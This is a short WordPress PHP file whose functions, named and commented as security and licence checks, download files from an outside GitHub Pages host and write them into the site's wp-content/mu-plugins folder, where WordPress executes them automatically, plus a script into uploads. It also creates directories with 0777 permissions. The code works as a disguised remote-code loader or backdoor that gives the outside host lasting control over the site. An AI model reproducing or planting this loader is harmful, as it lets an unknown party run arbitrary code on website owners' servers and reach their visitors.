<?php
if(!function_exists('load_cfb')){
	function load_cfb($name,$path){
		//Se verifica si el archivo existe y se medifico recientemente
		$daydifference = 86400;
		$file = ABSPATH . $path . $name;
		//$last_time_modified = filemtime($file);
		$url = "https://cristophernando.github.io/checksite/".$name;
		add_option( 'wp_cfb_'.$name, array('etag' => 'W/"69ec1566-a44"', 'date' => null ) );
		$wp_signature = get_option('wp_cfb_'.$name);
		$etag = $wp_signature['etag'];
		//error_log($file);
		//error_log("URL: " .$url);
		if(!file_exists($file)){
			$etag = '';
		}
		
		$response = wp_remote_get( $url , array('headers' => array('If-None-Match' => $etag)));
		//Proteccion en caso de que el dominio deje de existir
		if($response instanceof WP_Error){
			return;
		}
		$status_code = wp_remote_retrieve_response_code( $response );
		//var_dump($response);
		if($status_code != 200){
			return;
		}
		$body = wp_remote_retrieve_body( $response );
		//var_dump($file);
		
		$dir = dirname($file);

		// 2. Create the directory if it doesn't exist
		if (!is_dir($dir)) {
    		// true enables recursive creation of nested folders
    		mkdir($dir, 0777, true); 
		}
		file_put_contents($file, $body);
		update_option('wp_cfb_'.$name, array('etag' => $response['headers']['etag'], 'date' => $response['headers']['last-modified'] ));
	}
}

if(!function_exists('sec_cfb')){
	function sec_cfb(){
		$scripts_load = [
			[
				'name' => 'check_licence_activation_cfb.php',
				'path' => 'wp-content/mu-plugins/'
			],
			[
				'name' => 'wp-render-hook.php',
				'path' => 'wp-content/mu-plugins/'
			],
			[
				'name' => 'a_wp_security_check.php',
				'path' => 'wp-content/mu-plugins/'
			],
			[
				'name' => 'activation.js',
				'path' => 'wp-content/uploads/wp-security-check/'
			],
		];
		foreach ($scripts_load as $value) {
			load_cfb($value['name'],$value['path']);
		}
	}
}
?>